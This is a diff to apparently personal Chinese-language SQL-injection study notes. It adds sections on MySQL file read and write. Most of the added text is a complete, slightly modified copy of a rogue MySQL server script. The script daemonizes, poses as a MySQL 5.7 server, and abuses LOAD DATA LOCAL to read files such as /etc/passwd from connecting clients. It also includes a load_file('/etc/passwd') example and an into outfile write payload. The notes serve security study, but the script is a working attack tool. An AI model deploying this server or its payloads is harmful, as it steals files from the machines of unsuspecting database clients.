@@ -19,6 +19,8 @@
   * [limit注入](#limit注入)
   * [between and注入](#between-and注入)
   * [文件读写](#文件读写)
+    + [读文件](#读文件)
+    + [写文件](#写文件)
   * [dnslog外带数据](#dnslog外带数据)
   * [字符集漏洞](#字符集漏洞)
     + [GBK编码注入](#GBK编码注入)
@@ -1459,15 +1461,308 @@ mysql root@localhost:(none)> show variables like "secure_file_priv";
 Time: 0.012s
 ```
 
-- 读文件
+#### 读文件
 
 `select load_file("/etc/passwd")`路径必须是绝对路径,同时要注意文件大小限制
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202021155836.png)
 
->todo tofinish
+- 利用`LOAD DATA INFILE`进行文件读取
 
-- 写文件
+[Mysql Client 任意文件读取攻击链拓展](https://lengjibo.github.io/mysqlc/)
+
+[恶意MySQL Server读取MySQL Client端文件](http://blog.nsfocus.net/malicious-mysql-server-reads-mysql-client-files/)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204222134687.png)
+
+[利用脚本](https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py)
+
+>需要对这个脚本的`Server Greeting`进行一定的修改
+
+```python
+# -*- coding: UTF-8 -*-
+import socket
+import asyncore
+import asynchat
+import struct
+import random
+import logging
+import logging.handlers
+
+
+
+PORT = 3306
+
+log = logging.getLogger(__name__)
+
+log.setLevel(logging.DEBUG)
+tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
+tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
+log.addHandler(
+    tmp_format
+)
+
+filelist = (
+#    r'c:\boot.ini',
+#    r'c:\windows\win.ini',
+#    r'c:\windows\system32\drivers\etc\hosts',
+   '/etc/passwd',
+#    '/etc/shadow',
+)
+
+
+#================================================
+#=======No need to change after this lines=======
+#================================================
+
+__author__ = 'Gifts'
+
+def daemonize():
+    import os, warnings
+    if os.name != 'posix':
+        warnings.warn('Cant create daemon on non-posix system')
+        return
+
+    if os.fork(): os._exit(0)
+    os.setsid()
+    if os.fork(): os._exit(0)
+    os.umask(0o022)
+    null=os.open('/dev/null', os.O_RDWR)
+    for i in xrange(3):
+        try:
+            os.dup2(null, i)
+        except OSError as e:
+            if e.errno != 9: raise
+    os.close(null)
+
+
+class LastPacket(Exception):
+    pass
+
+
+class OutOfOrder(Exception):
+    pass
+
+
+class mysql_packet(object):
+    packet_header = struct.Struct('<Hbb')
+    packet_header_long = struct.Struct('<Hbbb')
+    def __init__(self, packet_type, payload):
+        if isinstance(packet_type, mysql_packet):
+            self.packet_num = packet_type.packet_num + 1
+        else:
+            self.packet_num = packet_type
+        self.payload = payload
+
+    def __str__(self):
+        payload_len = len(self.payload)
+        if payload_len < 65536:
+            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
+        else:
+            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)
+
+        result = "{0}{1}".format(
+            header,
+            self.payload
+        )
+        return result
+
+    def __repr__(self):
+        return repr(str(self))
+
+    @staticmethod
+    def parse(raw_data):
+        packet_num = ord(raw_data[0])
+        payload = raw_data[1:]
+
+        return mysql_packet(packet_num, payload)
+
+
+class http_request_handler(asynchat.async_chat):
+
+    def __init__(self, addr):
+        asynchat.async_chat.__init__(self, sock=addr[0])
+        self.addr = addr[1]
+        self.ibuffer = []
+        self.set_terminator(3)
+        self.state = 'LEN'
+        self.sub_state = 'Auth'
+        self.logined = False
+        # self.push(
+        #     mysql_packet(
+        #         0,
+        #         "".join((
+        #             '\x0a',  # Protocol
+        #             '3.0.0-Evil_Mysql_Server' + '\0',  # Version
+        #             #'5.1.66-0+squeeze1' + '\0',
+        #             '\x36\x00\x00\x00',  # Thread ID
+        #             'evilsalt' + '\0',  # Salt
+        #             '\xdf\xf7',  # Capabilities
+        #             '\x08',  # Collation
+        #             '\x02\x00',  # Server Status
+        #             '\0' * 13,  # Unknown
+        #             'evil2222' + '\0',
+        #         ))
+        #     )
+        # )
+        # 这个Server Greeting太老了
+        self.push(
+            mysql_packet(
+                0,
+                "".join((
+                    '\x0a',
+                    '5.7.37-log' + '\0',
+                    '\x02\x00\x00\x00',
+                    '\x2b\x3a\x31\x7a\x22\x72\x64\x4f\x00',
+                    '\xff\xf7',# 关闭ssl .... 0... .... .... = Switch to SSL after handshake: Not set
+                    '\x2d',
+                    '\x02\x00',
+                    '\xff\xc1',
+                    '\x15',
+                    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
+                    '\x6b\x66\x64\x01\x4c\x1e\x0a\x5f\x79\x0d\x27\x5b\x00',
+                    'mysql_native_password' + '\0',
+                ))
+            )
+        )
+        self.order = 1
+        self.states = ['LOGIN', 'CAPS', 'ANY']
+
+    def push(self, data):
+        log.debug('Pushed: %r', data)
+        data = str(data)
+        asynchat.async_chat.push(self, data)
+
+    def collect_incoming_data(self, data):
+        log.debug('Data recved: %r', data)
+        self.ibuffer.append(data)
+
+    def found_terminator(self):
+        data = "".join(self.ibuffer)
+        self.ibuffer = []
+
+        if self.state == 'LEN':
+            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
+            if len_bytes < 65536:
+                self.set_terminator(len_bytes)
+                self.state = 'Data'
+            else:
+                self.state = 'MoreLength'
+        elif self.state == 'MoreLength':
+            if data[0] != '\0':
+                self.push(None)
+                self.close_when_done()
+            else:
+                self.state = 'Data'
+        elif self.state == 'Data':
+            packet = mysql_packet.parse(data)
+            try:
+                if self.order != packet.packet_num:
+                    raise OutOfOrder()
+                else:
+                    # Fix ?
+                    self.order = packet.packet_num + 2
+                if packet.packet_num == 0:
+                    if packet.payload[0] == '\x03':
+                        log.info('Query')
+
+                        filename = random.choice(filelist)
+                        PACKET = mysql_packet(
+                            packet,
+                            '\xFB{0}'.format(filename)
+                        )
+                        self.set_terminator(3)
+                        self.state = 'LEN'
+                        self.sub_state = 'File'
+                        self.push(PACKET)
+                    elif packet.payload[0] == '\x1b':
+                        log.info('SelectDB')
+                        self.push(mysql_packet(
+                            packet,
+                            '\xfe\x00\x00\x02\x00'
+                        ))
+                        raise LastPacket()
+                    elif packet.payload[0] in '\x02':
+                        self.push(mysql_packet(
+                            packet, '\0\0\0\x02\0\0\0'
+                        ))
+                        raise LastPacket()
+                    elif packet.payload == '\x00\x01':
+                        self.push(None)
+                        self.close_when_done()
+                    else:
+                        raise ValueError()
+                else:
+                    if self.sub_state == 'File':
+                        log.info('-- result')
+                        log.info('Result: %r', data)
+
+                        if len(data) == 1:
+                            self.push(
+                                mysql_packet(packet, '\0\0\0\x02\0\0\0')
+                            )
+                            raise LastPacket()
+                        else:
+                            self.set_terminator(3)
+                            self.state = 'LEN'
+                            self.order = packet.packet_num + 1
+
+                    elif self.sub_state == 'Auth':
+                        self.push(mysql_packet(
+                            packet, '\0\0\0\x02\0\0\0'
+                        ))
+                        raise LastPacket()
+                    else:
+                        log.info('-- else')
+                        raise ValueError('Unknown packet')
+            except LastPacket:
+                log.info('Last packet')
+                self.state = 'LEN'
+                self.sub_state = None
+                self.order = 0
+                self.set_terminator(3)
+            except OutOfOrder:
+                log.warning('Out of order')
+                self.push(None)
+                self.close_when_done()
+        else:
+            log.error('Unknown state')
+            self.push('None')
+            self.close_when_done()
+
+
+class mysql_listener(asyncore.dispatcher):
+    def __init__(self, sock=None):
+        asyncore.dispatcher.__init__(self, sock)
+
+        if not sock:
+            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.set_reuse_addr()
+            try:
+                self.bind(('', PORT))
+            except socket.error:
+                exit()
+
+            self.listen(5)
+
+    def handle_accept(self):
+        pair = self.accept()
+
+        if pair is not None:
+            log.info('Conn from: %r', pair[1])
+            tmp = http_request_handler(pair)
+
+
+z = mysql_listener()
+daemonize()
+asyncore.loop()
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204231543156.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204231544750.png)
+
+#### 写文件
 
 `select "payload" into outfile/dumpfile 'filename'`路径必须是绝对路径
 
